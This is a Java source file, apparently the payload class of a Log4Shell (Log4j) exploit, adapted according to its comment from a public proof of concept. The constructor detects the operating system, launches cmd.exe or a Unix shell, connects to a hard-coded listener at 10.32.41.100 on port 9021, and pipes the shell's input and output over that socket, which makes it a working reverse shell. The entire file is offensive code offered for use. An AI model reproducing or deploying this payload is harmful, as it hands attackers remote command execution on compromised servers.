package com.zaneoblaneo.log4shellExploit;

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Shell {
	// was based off of the payload in https://github.com/kozmer/log4j-shell-poc/blob/main/poc.py but modified to allow it to do some resemblance of OS detection.
	public Shell() {
		// START CONFIG
		final String SHELL_LISTENER = "10.32.41.100";
		final int SHELL_PORT = 9021;
		// END CONFIG

		String command;
		if (System.getenv("OS").equals("Windows_NT")) {
			// it's windows!
			command = "C:/Windows/System32/cmd.exe";
		} else {
			// assume unix-like
			if (new File("/bin/bash").exists())
				command = "/bin/bash";
			else if (new File("/bin/zsh").exists())
				command = "/bin/zsh";
			else if (new File("/bin/sh").exists())
				command = "/bin/sh";
				// We don't know what kind of environment we're running on. Pray that the SHELL variable is set.
			else command = System.getenv("SHELL");

		}
		if (command == null || command.equals(""))
			return;


		Process p;
		Socket s;
		try {
			p = Runtime.getRuntime().exec(command);
			s = new Socket(SHELL_LISTENER, SHELL_PORT);
			InputStream si = s.getInputStream(), pi = p.getInputStream(), pe = p.getErrorStream();
			OutputStream so = s.getOutputStream(), po = p.getOutputStream();
			while (! s.isClosed()) {
				while (pi.available() > 0)
					so.write(pi.read());
				while (pe.available() > 0)
					so.write(pe.read());
				while (si.available() > 0)
					po.write(si.read());
				so.flush();
				po.flush();
				try {
					p.exitValue();
					break;
				} catch (Exception ignored) {
				}
			}
			s.close();
			p.destroy();
		} catch (Exception ignored) {

		}
	}
}
